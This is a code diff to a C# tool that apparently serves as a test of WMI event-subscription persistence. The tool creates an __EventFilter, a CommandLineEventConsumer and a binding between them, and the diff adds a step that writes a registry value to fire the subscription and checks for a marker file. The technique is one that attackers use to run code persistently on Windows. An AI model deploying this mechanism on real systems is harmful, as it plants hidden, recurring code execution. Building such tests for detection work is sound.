@@ -53,7 +53,7 @@ namespace A06_4_wmi_persistence
         {
             Console.WriteLine("[*] Initializing WMI Registration Flow...");
 
-            // Fix 2: Natively create the registry test path and initialize the watched property string
+            // 1. Natively create the registry test path and initialize the watched property string
             try
             {
 #pragma warning disable CA1416
@@ -77,7 +77,7 @@ namespace A06_4_wmi_persistence
             }
 
 #pragma warning disable CA1416
-            // 1. Create the Event Filter
+            // 2. Create the Event Filter
             ManagementClass filterClass = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
             ManagementObject filterObject = filterClass.CreateInstance();
             filterObject["Name"] = EventFilterName;
@@ -87,7 +87,7 @@ namespace A06_4_wmi_persistence
             filterObject.Put();
             Console.WriteLine("[+] Created __EventFilter successfully.");
 
-            // 2. Create the CommandLineEventConsumer
+            // 3. Create the CommandLineEventConsumer
             ManagementClass consumerClass = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
             ManagementObject consumerObject = consumerClass.CreateInstance();
             consumerObject["Name"] = ConsumerName;
@@ -95,18 +95,43 @@ namespace A06_4_wmi_persistence
             consumerObject.Put();
             Console.WriteLine("[+] Created CommandLineEventConsumer successfully.");
 
-            // 3. Create the FilterToConsumerBinding
+            // 4. Create the FilterToConsumerBinding
             ManagementClass bindingClass = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
             ManagementObject bindingObject = bindingClass.CreateInstance();
             bindingObject["Filter"] = filterObject.Path.RelativePath;
             bindingObject["Consumer"] = consumerObject.Path.RelativePath;
             bindingObject.Put();
             Console.WriteLine("[+] Created __FilterToConsumerBinding successfully.");
+#pragma warning restore CA1416
 
             Console.WriteLine("\n[+] Verification Info: Installation Complete.");
-            Console.WriteLine("[*] Set the 'Trigger' value inside the key to execute the consumer.");
-        }
+
+            // Automated Trigger Integration
+            Console.WriteLine("[*] Automatically executing validation trigger modification...");
+            try
+            {
+#pragma warning disable CA1416
+                // The '!' at the end tells the compiler you guarantee this will not be null
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\A06_4_Test", true)!)
+                {
+                    if (key != null)
+                    {
+                        // Modify the value to fire the RegistryValueChangeEvent WMI trigger
+                        key.SetValue("Trigger", "A06_4_FIRE", RegistryValueKind.String);
+
+                        // Flush forces physical serialization to disk immediately
+                        key.Flush();
+                        Console.WriteLine("[+] Fired trigger: HKLM\\SOFTWARE\\A06_4_Test -> Trigger = 'A06_4_FIRE'");
+                    }
+                }
 #pragma warning restore CA1416
+                Console.WriteLine("[*] Check C:\\Users\\Public\\A06_4_marker.txt to verify WmiPrvSE execution success.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] Failed to execute automated registry trigger: {ex.Message}");
+            }
+        }
 
 #pragma warning disable CA1416
         private static void ExecuteCleanup(ManagementScope scope)
